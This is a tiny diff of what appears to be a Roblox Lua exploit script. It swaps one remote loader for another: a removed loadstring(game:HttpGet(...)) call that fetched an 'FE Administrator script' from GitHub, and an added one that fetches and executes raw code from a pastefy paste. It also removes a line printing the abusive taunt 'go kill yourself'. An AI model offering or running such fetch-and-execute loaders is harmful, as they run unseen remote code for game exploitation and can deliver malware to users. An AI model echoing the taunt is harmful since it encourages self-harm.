@@ -1,3 +1,1 @@
-print ("go kill yourself")
-
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/Vixcit/Vixcit/main/%5BFE%5D%20Administrator%20script'),true))()
+loadstring(game:HttpGet(('https://pastefy.ga/eO9WWFOi/raw'),true))()
